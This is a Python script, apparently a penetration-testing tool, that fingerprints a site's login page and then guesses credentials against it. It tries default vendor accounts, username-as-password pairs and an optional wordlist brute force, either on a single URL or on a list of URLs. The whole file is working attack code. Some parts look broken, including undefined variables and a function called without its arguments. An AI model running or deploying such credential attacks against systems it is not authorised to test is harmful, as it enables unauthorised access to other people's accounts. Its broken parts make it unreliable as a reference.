#! /usr/bin/env python3
# -*- coding: utf-8 -*-

import requests
import argparse
import traceback
import sys, os, re
import time

from fingerprint.finger_printing import finger_print
from templates.cms_templates import cms_type
from templates.other_templates import other_type
from credz.default_password import default_passwords

requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)


def first_check(url, username_input, password_input):
    """ 
    first_check: gets the page size for comparison when testing default passwords
    """
    login ={username_input: "azefraezfr", password_input: "azefraezfr"}
    req = requests.post(url, data=login, verify=False, allow_redirects=False, timeout=10)
    page_len = len(req.text)
    return page_len


def default_user_as_pass(url, username_input=False, password_input=False, fc=False, basic=False):
    payl = ["admin", "administrateur", "test", "root", "guest", "anonymous"]
    for p in payl:
        login = {username_input: p, password_input: p}
        req = requests.post(url, data=login, verify=False, allow_redirects=False, timeout=10) if not basic else requests.post(url, auth=(p, p), verify=False, allow_redirects=False, timeout=10)
        if len(req.text) not in range(fc - 100, fc + 100):
            print("Potentially account found: {}:{}".format(p, p))
        elif len(req.text) not in range(fc - 200, fc + 200):
            print("Account found: {}:{}".format(p, p))
            if not urls_file:
                sys.exit()
            return True
        sys.stdout.write("\033[34muser: {} | password: {}\033[0m\r".format(p, p))
        sys.stdout.write("\033[K")




def test_default_password(url, username_input, password_input, username, password, fc):
    """
    test_default_password: Test known default password
    """
    login ={username_input: username, password_input: password}
    req = requests.post(url, data=login, verify=False, allow_redirects=False, timeout=10)
    if len(req.text) not in range(fc - 10, fc + 10):
        print("Account found: {}".format(login))
        return True
    sys.stdout.write("\033[34muser: {} | password: {}\033[0m\r".format(username, password))
    sys.stdout.write("\033[K")


def bf_top_password(url, username_input, password_input, fc):
    print("[i] Bruteforce username/password")
    usernames = ["admin", "administrateur", "test", "root", "guest", "anonymous"]
    for user in usernames:
        with open(dico, "r+") as top_pass:
            for tp in top_pass.read().splitlines():
                login = {username_input: user, password_input: tp}
                req = requests.post(url, data=login, verify=False, allow_redirects=False, timeout=10)
                if len(req.text) not in range(fc - 10, fc + 10):
                    print("Account found: {}".format(login))
                    return True
                sys.stdout.write("\033[34muser: {} | password: {}\033[0m\r".format(user, tp))
                sys.stdout.write("\033[K")


def basic_auth(url):
    """
    basic_auth: test http authentification
    """
    usernames = ["admin", "administrateur", "test", "root", "guest", "anonymous"]
    default_user_as_pass(url)
    for user in usernames:
        with open(dico, "r+") as top_pass:
            for tp in top_pass.read().splitlines():
                req = requests.post(url, auth=(user, tp), verify=False, allow_redirects=False, timeout=10)
                if req.status_code not in [401, 403]:
                    print("Account found: {}:{}".format(user, tp))
                    sys.exit()
                sys.stdout.write("\033[34muser: {} | password: {}\033[0m\r".format(user, tp))
                sys.stdout.write("\033[K")


def test_credz(url, check_template, type_techno=False):
    tdp = False
    username_input = check_template.split(":")[0]
    password_input = check_template.split(":")[1]
    fc = first_check(url, username_input, password_input)
    if type_techno:
        for dp in default_passwords:
            if dp == type_techno.lower():
                for d in default_passwords[dp]:
                    username = d.split(":")[0]
                    password = d.split(":")[1]
                    tdp = test_default_password(url, username_input, password_input, username, password, fc)
    if not tdp:
        print(" [-] Default account not found")
        print(" [i] Test user-as-pass")
        default_user_as_pass(url, username_input, password_input, fc)
        if bf:
            btp = bf_top_password(url, username_input, password_input, fc)
            if not btp:
                print(" [-] Default Account not found")


def main(url):
    fg = finger_print()

    app_type = fg.whatisapp(url)

    if app_type != "web":
        basic_auth(url)
    else:
        try:    
            cms_name = fg.cms_check(url)
            if cms_name:
                print(" [i] {}".format(cms_name))
                check_template = cms_type(cms_name)
                if check_template:
                    test_credz(url, check_template, cms_name)
                else:
                    print(" [-] CMS template not found")
            else:
                print(" [i] Not seem to be a CMS")
                other_name = fg.other_check(url)
                if len(other_name) != 2:
                    check_template = other_type(other_name)
                    test_credz(url, check_template, other_name)
                elif len(other_name) == 2:
                    credz_input = "{}:{}".format(other_name[0], other_name[1])
                    test_credz(url, credz_input)
                else:
                    print(" [-] Nothing template not found")
        except KeyboardInterrupt:
            if not file_url:
                print(" [i] Canceled by keyboard interrupt (Ctrl-C) ")
                sys.exit()
            else:
                print(" [i] Canceled by keyboard interrupt (Ctrl-C), next site ")
    print("-"*30)


if __name__ == '__main__':
    parser = argparse.ArgumentParser()

    parser.add_argument("-u", help="URL login to test \033[31m[required]\033[0m", dest='url')
    parser.add_argument('-U', '--urls_file', action='store', help='Provide file instead of url, one per line.', dest='urls_file')
    parser.add_argument('-uap', '--user-as-pass',  help='test user-as-pass', dest='uap', action='store')
    parser.add_argument('-w', help="list of your passwords to test \033[32mDefault: credz/top_200_default_passwd.txt\033[0m", dest='dico', default="credz/top_200_default_passwd.txt", action='store')
    parser.add_argument('-b', '--bruteforce', help="Bruteforce username/password", action='store_true', dest='bf')

    results = parser.parse_args()
                                     
    url = results.url
    urls_file = results.urls_file
    dico = results.dico
    uap = results.uap #TODO
    bf = results.bf

    if len(sys.argv) < 2:
        print("{}URL target is missing, try using -u <url> or -h for help".format(INFO))
        parser.print_help()
        sys.exit()
    if not urls_file:
        print(" [i] URL: {}".format(url))
        url = url + "/" if url.split("/")[-1] != "" else url
        main(url)
    else:
        with open(urls_file, "r+") as uf:
            for u in uf.readlines():
                print(" [i] URL: {}".format(u))
                main(u.strip())